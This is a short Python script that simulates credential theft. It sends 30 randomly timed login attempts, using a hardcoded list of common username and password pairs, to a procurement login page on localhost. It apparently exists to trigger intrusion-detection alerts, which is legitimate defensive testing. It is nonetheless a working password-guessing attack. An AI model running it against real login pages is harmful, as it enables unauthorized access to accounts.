#!/usr/bin/env python3
# local_attack.py - Simulates credential theft on localhost

import requests
import time
import random

TARGET = "http://127.0.0.1/procurement/login.php"
PAYLOADS = [
    ("admin", "admin123"),
    ("admin", "password"),
    ("staff1", "staff123"),
    ("admin", "admin"),
    ("staff1", "wrongpass"),
    ("admin", "letmein"),
    ("staff1", "staff"),
    ("admin", "123456"),
]

def send_login(user, passwd):
    try:
        r = requests.post(TARGET, data={"username": user, "password": passwd}, timeout=2)
        print(f"[*] Local attack: {user}:{passwd} -> {r.status_code}")
        return r
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

if __name__ == "__main__":
    print("[*] Starting LOCAL credential theft simulation on 127.0.0.1...")
    for i in range(30):  # 30 login attempts
        user, passwd = random.choice(PAYLOADS)
        send_login(user, passwd)
        time.sleep(random.uniform(0.3, 1.5))
    print("[*] Local simulation complete. Check IDS alerts.")
